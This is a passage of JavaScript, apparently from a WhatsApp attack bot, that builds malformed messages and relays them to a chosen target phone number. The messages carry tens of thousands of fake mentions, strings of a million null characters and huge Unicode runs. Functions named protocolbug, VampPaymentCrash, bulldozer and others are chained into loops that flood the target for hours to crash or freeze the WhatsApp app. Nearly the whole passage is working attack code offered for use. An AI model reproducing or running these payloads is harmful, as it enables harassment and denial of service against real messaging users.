      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
async function FolwareFunction(target, folware) {
  const folwaredellay = Array.from({ length: 30000 }, (_, r) => ({
    title: "᭡꧈".repeat(92000) + "ꦽ".repeat(92000) + "\u0003".repeat(92000),
    rows: [{ title: `${r + 1}`, id: `${r + 1}` }],
  }));
  const MSG = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "\u0003",
          listType: 2,
          buttonText: null,
          sections: folwaredellay,
          singleSelectReply: { selectedRowId: "🗿" },
          contextInfo: {
            mentionedJid: Array.from(
              { length: 9741 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "9741@newsletter",
              serverMessageId: 1,
              newsletterName: "-",
            },
          },
          description: "\u0003",
        },
      },
    },
    contextInfo: {
      channelMessage: true,
      statusAttributionType: 2,
    },
  };
  const MassageFolware = {
    extendedTextMessage: {
      text: "\u0003".repeat(12000),
      matchedText: "https://" + "ꦾ".repeat(500) + ".com",
      canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
      description: "\u0003".repeat(500),
      title: "\u200D".repeat(1000),
      previewType: "NONE",
      jpegThumbnail: Buffer.alloc(10000),
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          showAdAttribution: true,
          title: "\u0003",
          body: "\u0003".repeat(10000),
          thumbnailUrl: "https://" + "ꦾ".repeat(500) + ".com",
          mediaType: 1,
          renderLargerThumbnail: true,
          sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz",
        },
        mentionedJid: Array.from(
          { length: 1000 },
          (_, i) => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`
        ),
      },
    },
    paymentInviteMessage: {
      currencyCodeIso4217: "USD",
      amount1000: "999999999",
      expiryTimestamp: "9999999999",
      inviteMessage: "Payment Invite" + "\u0003".repeat(1770),
      serviceType: 1,
    },
  };
  
  const msg = generateWAMessageFromContent(target, MSG, MassageFolware, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (folware) {
    await sock.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 15,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: "⃔ Folware Function 🎵‌",
            },
            content: undefined,
          },
        ],
      }
    );
  }
}
async function protocolbug6(isTarget, mention) {
  let msg = await generateWAMessageFromContent(isTarget, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: "X-VEROS ",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "TREDICT INVICTUS", // GAUSAH GANTI KOCAK ERROR NYALAHIN GUA
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9741,
            forwardedNewsletterMessageInfo: {
              newsletterName: "trigger newsletter ( @tamainfinity )",
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            }
          }
        }
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: isTarget }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await sock.relayMessage(isTarget, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            type: 25
          },
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂" },
              content: undefined
            }
          ]
        }
      }
    }, {});
  }
}
async function yukiInvisClrs(target, show) {
            let msg = await generateWAMessageFromContent(target, {
                buttonsMessage: {
                    text: "🩸",
                    contentText:
                        "🩸 эмне үчүн эмесXylaysX",
                    footerText: "🩸 эмне үчүн эмесXylaysX",
                    buttons: [
                        {
                            buttonId: ".aboutb",
                            buttonText: {
                                displayText: "🩸 эмне үчүн эмесXylaysX" + "\u0000".repeat(500000),
                            },
                            type: 1,

},
                    ],
                    headerType: 1,
                },
            }, {});
        
            await sock.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
        
            if (show) {
                await sock.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: {
                                    is_status_mention: "Fuck you",
                                },
                                content: undefined,
                            },
                        ],
                    }
                );
            }            
        }
async function InVisibleX1(target, show) {
            let msg = await generateWAMessageFromContent(target, {
                buttonsMessage: {
                    text: "🩸",
                    contentText:
                        "𑲭𑲭𝘼𝙍𝙂𝘼 𝙄𝙉𝙑𝙄𝙕𐎟𑆻",
                    footerText: "𝘼𝙍𝙂𝘼 𝙊𝙁𝙁 ",
                    buttons: [
                        {
                            buttonId: ".aboutb",
                            buttonText: {
                                displayText: "𐎟𑆻𝘼𝙍𝙂𝘼 𝙄𝙉𝙑𝙄𝙎 𐎟𑆻 " + "\u0000".repeat(900000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await sock.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
        
            if (show) {
                await sock.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 15,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: {
                                    is_status_mention: "𐎟𑆻𝘼𝙍𝙂𝘼 𝙄𝙉𝙑𝙄𝙎𐎟𑆻⃔‌",
                                },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }
async function VampAIChatCrash(target, Ptcp = true) {
 await sock.relayMessage(target, {
 viewOnceMessage: {
 message: {
 interactiveResponseMessage: {
 body: {
 text: "Vampire.Firebase",
 format: "DEFAULT"
 },
 nativeFlowResponseMessage: {
 name: "chat_assist_request",
 paramsJson: JSON.stringify({ 
 query: "\u0000".repeat(1000000) 
 }),
 version: 3
 }
 }
 }
 }
 }, { participant: { jid: target }});
}
async function VampPaymentCrash(target, Ptcp = true) {
 await sock.relayMessage(target, {
 viewOnceMessage: {
 message: {
 interactiveResponseMessage: {
 body: {
 text: "Vampire.biz.net",
 format: "DEFAULT"
 },
 nativeFlowResponseMessage: {
 name: "payment_transaction_request",
 paramsJson: "\u0000".repeat(1000000),
 version: 3
 }
 }
 }
 }
 }, { participant: { jid: target }});
}
async function bulldozer(isTarget) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(isTarget, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: isTarget },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function protocolbug5(target, mention) {
  const mentionedList = [
    "13135550002@s.whatsapp.net",
    ...Array.from(
      { length: 40000 },
      () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    ),
  ];

  const embeddedMusic = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: ".xataa¡?" + "ោ៝".repeat(10000),
    title: "Apocalypse",
    artworkDirectPath:
      "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU=",
  };

  const videoMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
    fileLength: "289511",
    seconds: 15,
    mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
    caption: "jaja",
    height: 640,
    width: 640,
    fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
    directPath:
      "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1743848703",
    contextInfo: {
      isSampled: true,
      mentionedJid: mentionedList,
    },
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363334766163982@newsletter",
      serverMessageId: 1,
      newsletterName: "χඞ",
    },
    streamingSidecar:
      "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
    thumbnailDirectPath:
      "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
    thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
    thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
    annotations: [
      {
        embeddedContent: {
          embeddedMusic,
        },
        embeddedAction: true,
      },
    ],
  };

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: { videoMessage },
      },
    },
    {}
  );

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await sock.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "true" },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function protocolbug3(target, mention) {
  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          videoMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
            mimetype: "video/mp4",
            fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
            fileLength: "999999",
            seconds: 999999,
            mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
            caption:
              "鈳� 饾悈 饾悽蜏廷蜖虌汀汀谈谭谭谭蜏廷 饾悕 饾悎 饾悧蜏廷-鈥�",
            height: 999999,
            width: 999999,
            fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
            directPath:
              "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1743742853",
            contextInfo: {
              isSampled: true,
              mentionedJid: [
                "13135550002@s.whatsapp.net",
                ...Array.from(
                  { length: 30000 },
                  () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                ),
              ],
            },
            streamingSidecar:
              "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
            thumbnailDirectPath:
              "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
            thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
            thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
            annotations: [
              {
                embeddedContent: {
                  embeddedMusic: {
                    musicContentMediaId: "kontol",
                    songId: "peler",
                    author: ".Tama Ryuichi" + "貍賳貎貏俳貍賳貎".repeat(100),
                    title: "Finix",
                    artworkDirectPath:
                      "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                    artworkSha256:
                      "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                    artworkEncSha256:
                      "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                    artistAttribution:
                      "https://www.instagram.com/_u/tamainfinity_",
                    countryBlocklist: true,
                    isExplicit: true,
                    artworkMediaKey:
                      "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ=",
                  },
                },
                embeddedAction: null,
              },
            ],
          },
        },
      },
    },
    {}
  );

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await sock.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: { protocolMessage: { key: msg.key, type: 25 } },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "true" },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function xatanicaldelay(target, mention) {
  const generateMessage = {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          caption: "Bellakuuu",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "19769",
          height: 354,
          width: 783,
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath:
            "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          jpegThumbnail: null,
          scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
          scanLengths: [2437, 17332],
          contextInfo: {
            mentionedJid: Array.from(
              { length: 30000 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
          },
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, generateMessage, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await sock.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "𝐁𝐞𝐭𝐚 𝐏𝐫𝐨𝐭𝐨𝐜𝐨𝐥 - 𝟗𝟕𝟒𝟏" },
            content: undefined,
          },
        ],
      }
    );
  }
}



// [ PENGERAS FUNCTION ]
async function Function01(durationHours, target) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
      console.log(`Stopped after sending ${count} messages`);
      return;
    }

    try {
      if (count < 150) {
        InVisibleX1(target, false)
        await new Promise((resolve) => setTimeout(resolve, 1000));
        CosmoApiDelay(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        yukiInvisClrs(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        protocolbug5(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        protocolbug3(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        xatanicaldelay(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        console.log(
          chalk.red(`Sendding Bug Traz Invictus.. ${count}/150 to ${target}`)
        );
        count++;
        setTimeout(sendNext, 1000);
      } else {
        console.log(chalk.green(`✅ Success Sending 150 messages to ${target}`));
        count = 0;
        console.log(chalk.red("➡️ Next 150 Messages"));
        setTimeout(sendNext, 150);
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);

      setTimeout(sendNext, 100);
    }
  };

  sendNext();
}

async function Function02(durationHours, target) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
      console.log(`Stopped after sending ${count} messages`);
      return;
    }

    try {
      if (count < 250) {
        protocolbug6(target, false)
        await new Promise((resolve) => setTimeout(resolve, 1000));
        FolwareFunction(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        xatanicaldelayv2(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        protocolbug5(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        protocolbug3(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        xatanicaldelay(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        console.log(
          chalk.red(`Sendding Bug Traz Invictus.. ${count}/250 to ${target}`)
        );
        count++;
        setTimeout(sendNext, 1000);
      } else {
        console.log(chalk.green(`✅ Success Sending 250 messages to ${target}`));
        count = 0;
        console.log(chalk.red("➡️ Next 250 Messages"));
        setTimeout(sendNext, 150);
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);

      setTimeout(sendNext, 100);
    }
  };

  sendNext();
}

async function Function03(durationHours, target) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
      console.log(`Stopped after sending ${count} messages`);
      return;
    }

    try {
      if (count < 350) {
        protocolbug6(target, false)
        await new Promise((resolve) => setTimeout(resolve, 1000));
        FolwareFunction(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        xatanicaldelayv2(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        InVisibleX1(target, false)
        await new Promise((resolve) => setTimeout(resolve, 1000));
        CosmoApiDelay(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        yukiInvisClrs(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        ExTraKouta(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        protocolbug5(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        protocolbug3(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        xatanicaldelay(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        console.log(
          chalk.red(`Sendding Bug Traz Invictus.. ${count}/350 to ${target}`)
        );
        count++;
        setTimeout(sendNext, 1000);
      } else {
        console.log(chalk.green(`✅ Success Sending 350 messages to ${target}`));
        count = 0;
        console.log(chalk.red("➡️ Next 350 Messages"));
        setTimeout(sendNext, 150);
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);

      setTimeout(sendNext, 100);
    }
  };

  sendNext();
}

async function ComboXfunc(durationHours, target) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
      console.log(`Stopped after sending ${count} messages`);
      return;
    }

    try {
      if (count < 500) {
        protocolbug6(target, false)
        await new Promise((resolve) => setTimeout(resolve, 1000));
        FolwareFunction(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        xatanicaldelayv2(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        InVisibleX1(target, false)
        await new Promise((resolve) => setTimeout(resolve, 1000));
        CosmoApiDelay(target, false) 
        VampPaymentCrash(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        bulldozer(target) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        protocolbug5(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        protocolbug3(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        xatanicaldelay(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        await new Promise((resolve) => setTimeout(resolve, 1000));
        yukiInvisClrs(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        ExTraKouta(target) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        protocolbug6(target, false)
        await new Promise((resolve) => setTimeout(resolve, 1000));
        FolwareFunction(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        xatanicaldelayv2(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        InVisibleX1(target, false)
        await new Promise((resolve) => setTimeout(resolve, 1000));
        CosmoApiDelay(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        yukiInvisClrs(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        ExTraKouta(target) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        xatanicaldelay(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        VampAIChatCrash(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        bulldozer(target) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        protocolbug5(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        protocolbug3(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        xatanicaldelay(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        console.log(
          chalk.red(`Sendding Bug Traz Invictus.. ${count}/500 to ${target}`)
        );
        count++;
        setTimeout(sendNext, 1000);
      } else {
        console.log(chalk.green(`✅ Success Sending 500 messages to ${target}`));
        count = 0;
        console.log(chalk.red("➡️ Next 500 Messages"));
        setTimeout(sendNext, 150);
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);

      setTimeout(sendNext, 100);
    }
  };

  sendNext();
}

async function ComboXfunc02(durationHours, target) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
      console.log(`Stopped after sending ${count} messages`);
      return;
    }

    try {
      if (count < 1000) {
        xatanicaldelay(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        VampSuperDelay(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        Xvold(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        xatanicaldelay(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        VampSuperDelay(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        Xvold(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        xatanicaldelay(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        VampSuperDelay(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        Xvold(target, false) 
        await new Promise((resolve) => setTimeout(resolve, 1000));
        console.log(
          chalk.red(`Sendding Bug Traz Invictus.. ${count}/1000 to ${target}`)
        );
